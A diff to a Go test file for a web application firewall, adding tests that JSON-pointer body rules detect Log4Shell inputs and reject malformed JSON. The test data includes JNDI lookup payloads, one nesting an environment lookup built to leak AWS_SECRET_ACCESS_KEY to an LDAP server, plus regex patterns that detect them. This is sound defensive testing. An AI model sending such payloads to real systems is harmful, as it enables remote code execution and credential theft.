@@ -381,12 +381,70 @@ func TestHTTPAssignmentsPreserveNamedHeaderCookieMethodAndBodyStates(t *testing.
 		return sharedPreparedRule{ID: id, Carrier: carrier, Name: name, Pattern: regexpMust(t, pattern)}
 	}
 	request := sharedHTTPInput{Method: "PATCH", Headers: []sharedHTTPField{{Name: "X-Exact-Name", Value: "header-value"}}, Cookies: []sharedHTTPField{{Name: "session", Value: "cookie-value"}}, Body: present}
-	for _, candidate := range []sharedPreparedRule{rule("h", "header", "x-exact-name", "^header-value$"), rule("c", "cookie", "session", "^cookie-value$"), rule("m", "method", "", "^PATCH$"), rule("b", "body", "", "attack")} {
+	for _, candidate := range []sharedPreparedRule{rule("h", "header", "x-exact-name", "^header-value$"), rule("c", "cookie", "session", "^cookie-value$"), rule("m", "method", "", "^PATCH$"), rule("b", "body", "", "attack"), rule("s", "body", "/payload", "^attack$")} {
 		waf := sharedPreparedWAF{rules: map[string]sharedPreparedRule{"component": candidate}, alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}}}}
 		matched, _, err := waf.evaluate(sharedRouteBinding{}, request, bodyBytes)
 		if err != nil || !matched {
 			t.Fatalf("carrier %s matched=%v err=%v", candidate.Carrier, matched, err)
 		}
+	}
+}
+
+func TestStructuredBodySelectorsMatchLog4ShellInputs(t *testing.T) {
+	rule := func(id, name, pattern string) sharedPreparedRule {
+		return sharedPreparedRule{ID: id, Carrier: "body", Name: name, Pattern: regexpMust(t, pattern)}
+	}
+	tests := []struct {
+		name    string
+		body    string
+		rule    sharedPreparedRule
+		matched bool
+	}{
+		{
+			name:    "input pointer",
+			body:    `{"input":"${jndi:ldap://127.0.0.1:1389/a}"}`,
+			rule:    rule("input", "/input", `^\$\{jndi:(?:ldap|rmi)://(?:127\.0\.0\.1:1389|janus\-alternate\.invalid)(?:/a|/janus\-bypass\-probe)\}$`),
+			matched: true,
+		},
+		{
+			name:    "message pointer with nested expression",
+			body:    `{"message":"${jndi:ldap://127.0.0.1/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}"}`,
+			rule:    rule("message", "/message", `^\$\{jndi:(?:ldap|rmi)://(?:127\.0\.0\.1|janus\-alternate\.invalid)(?:/janus\-bypass\-probe|/z\?leak=\$\{env:AWS_SECRET_ACCESS_KEY:\-NO_EXISTS)\}\}$`),
+			matched: true,
+		},
+		{
+			name:    "absent pointer does not match",
+			body:    `{"other":"attack"}`,
+			rule:    rule("absent", "/input", `^attack$`),
+			matched: false,
+		},
+		{
+			name:    "non-string pointer does not match",
+			body:    `{"input":{"nested":"attack"}}`,
+			rule:    rule("object", "/input", `^attack$`),
+			matched: false,
+		},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			waf := sharedPreparedWAF{rules: map[string]sharedPreparedRule{"component": test.rule}, alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}}}}
+			matched, _, err := waf.evaluate(sharedRouteBinding{}, sharedHTTPInput{}, []byte(test.body))
+			if err != nil || matched != test.matched {
+				t.Fatalf("matched=%v err=%v", matched, err)
+			}
+		})
+	}
+}
+
+func TestStructuredBodySelectorRejectsMalformedJSON(t *testing.T) {
+	waf := sharedPreparedWAF{
+		rules: map[string]sharedPreparedRule{
+			"component": {ID: "body-rule", Carrier: "body", Name: "/input", Pattern: regexpMust(t, "attack")},
+		},
+		alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}}},
+	}
+	if _, _, err := waf.evaluate(sharedRouteBinding{}, sharedHTTPInput{}, []byte(`{"input":`)); err == nil || !strings.Contains(err.Error(), "decode structured body") {
+		t.Fatalf("malformed structured body error = %v", err)
 	}
 }
 
